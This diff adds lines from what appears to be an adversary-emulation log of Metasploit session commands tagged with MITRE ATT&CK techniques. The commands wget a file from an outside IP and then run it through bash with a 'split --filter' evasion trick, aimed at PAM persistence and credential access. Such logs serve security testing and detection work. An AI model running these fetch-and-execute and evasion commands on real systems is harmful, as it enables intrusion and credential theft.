@@ -1,0 +1,6 @@
+2025-09-22 08:01:11 INFO - Executing Msf-Session-Command: 'cd /root; wget -O README.txt http://192.42.1.174/README.txt.4'
+2025-09-22 08:01:11 INFO - Metadata: {"techniques": "T1105,T1556.003", "tactics": "Command and Control,Persistence,Credential Access", "technique_name:\"Ingress Tool Transfer,Modify Authentication Process": "Pluggable Authentication Modules\""}
+2025-09-22 08:01:11 INFO - Executing a msf-command
+2025-09-22 08:01:28 INFO - Executing Msf-Session-Command: 'split --filter="cat $FILE | xargs bash -c " -C 2000 /root/README.txt'
+2025-09-22 08:01:28 INFO - Metadata: {"techniques": "T1218,T1556.003", "tactics": "Defense Evasion,Persistence,Credential Access", "technique_name": "System Binary Proxy Execution,Modify Authentication Process: Pluggable Authentication Modules"}
+2025-09-22 08:01:28 INFO - Executing a msf-command
